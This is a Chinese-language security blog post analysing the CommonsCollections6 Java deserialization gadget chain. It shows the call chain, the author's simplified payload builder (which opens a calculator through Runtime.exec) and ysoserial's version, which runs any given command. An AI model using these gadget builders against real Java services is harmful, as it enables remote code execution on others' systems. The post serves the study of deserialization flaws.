---
title: "Java反序列化利用链学习 - CommonCollection6"
date: 2022-05-05T14:21:00+08:00
lastmod: 2022-05-05T17:23:00+08:00
draft: false
lightgallery: true
categories: [
    "Java Security",
]
tags: [
    "deserialiaztion",
    "java",
    "common collection",
]
---
## Java反序列化利用链系列

* [Java反序列化利用链 - CommonCollection1](commoncollection1.md)
* [Java反序列化利用链 - CommonCollection2](commoncollection2.md)
* [Java反序列化利用链 - CommonCollection3](commoncollection3.md)
* [Java反序列化利用链 - CommonCollection4](commoncollection4.md)
* [Java反序列化利用链 - CommonCollection5](commoncollection5.md)
* [Java反序列化利用链 - CommonCollection6](commoncollection6.md)
* [Java反序列化利用链 - CommonCollection7](commoncollection7.md)

## Java反序列化利用链 - CommonCollection6

### 前置条件

* commons-collections 3.1

### 利用链分析

`CommonCollection6`利用链的调用过程大致如下：

```
Gadget chain:
    java.io.ObjectInputStream.readObject()
        java.util.HashSet.readObject()
            java.util.HashMap.put()
            java.util.HashMap.hash()
                org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()
                org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()
                    org.apache.commons.collections.map.LazyMap.get()
                        org.apache.commons.collections.functors.ChainedTransformer.transform()
                        org.apache.commons.collections.functors.InvokerTransformer.transform()
                            java.lang.reflect.Method.invoke()
                        org.apache.commons.collections.functors.InvokerTransformer.transform()
                            java.lang.reflect.Method.invoke()
                        org.apache.commons.collections.functors.InvokerTransformer.transform()
                            java.lang.reflect.Method.invoke()
                                java.lang.Runtime.exec()
```

这条链的前半部分`HashSet#readObject()->TiedMapEntry#getValue()`的过程并不复杂，不细说了。稍微复杂一点的地方在这条利用链的构造上（看`ysoserial`源码就知道了），如果直接通过构造构造函数来创建，会导致`writeObject`出现异常。这里我写了个简易版，但不保证通用性。

```java
public Object getObject(String command) throws Exception {
    Transformer[] falseTransformer = new Transformer[] {
            new ConstantTransformer(1)
    };
    Transformer[] trueTransformer = new Transformer[] {
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer("getMethod",
                    new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
            new InvokerTransformer("invoke",
                    new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
            new InvokerTransformer("exec",
                    new Class[]{String.class}, new Object[]{"open /System/Applications/Calculator.app"})
    };

    ChainedTransformer chainedTransformer = new ChainedTransformer(falseTransformer);

    LazyMap lazyMap = (LazyMap) LazyMap.decorate(new HashMap(), chainedTransformer);

    TiedMapEntry tiedMapEntry = new TiedMapEntry(new HashMap<>(), 2);
    Reflections.setFieldValue(tiedMapEntry, "map", lazyMap);

    HashMap hashMap = new HashMap();
    hashMap.put(1, 1);
    Field table = Reflections.getField(hashMap.getClass(), "table");

    Object[] entry = (Object[]) table.get(hashMap);
    Reflections.setFieldValue(entry[1], "key", tiedMapEntry);

    HashSet hashSet = new HashSet();
    Reflections.setFieldValue(hashSet, "map", hashMap);

    Reflections.setFieldValue(chainedTransformer, "iTransformers", trueTransformer);

    return hashSet;
}
```

`ysoserial`中的相关代码如下

```java
public Serializable getObject(final String command) throws Exception {

    final String[] execArgs = new String[] { command };

    final Transformer[] transformers = new Transformer[] {
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer("getMethod", new Class[] {
                    String.class, Class[].class }, new Object[] {
                    "getRuntime", new Class[0] }),
            new InvokerTransformer("invoke", new Class[] {
                    Object.class, Object[].class }, new Object[] {
                    null, new Object[0] }),
            new InvokerTransformer("exec",
                    new Class[] { String.class }, execArgs),
            new ConstantTransformer(1) };

    Transformer transformerChain = new ChainedTransformer(transformers);

    final Map innerMap = new HashMap();

    final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);

    TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");

    HashSet map = new HashSet(1);
    map.add("foo");
    Field f = null;
    try {
        f = HashSet.class.getDeclaredField("map");
    } catch (NoSuchFieldException e) {
        f = HashSet.class.getDeclaredField("backingMap");
    }

    Reflections.setAccessible(f);
    HashMap innimpl = (HashMap) f.get(map);

    Field f2 = null;
    try {
        f2 = HashMap.class.getDeclaredField("table");
    } catch (NoSuchFieldException e) {
        f2 = HashMap.class.getDeclaredField("elementData");
    }

    Reflections.setAccessible(f2);
    Object[] array = (Object[]) f2.get(innimpl);

    Object node = array[0];
    if(node == null){
        node = array[1];
    }

    Field keyField = null;
    try{
        keyField = node.getClass().getDeclaredField("key");
    }catch(Exception e){
        keyField = Class.forName("java.util.MapEntry").getDeclaredField("key");
    }

    Reflections.setAccessible(keyField);
    keyField.set(node, entry);

    return map;

}
```

## References

1. <https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections4.java>
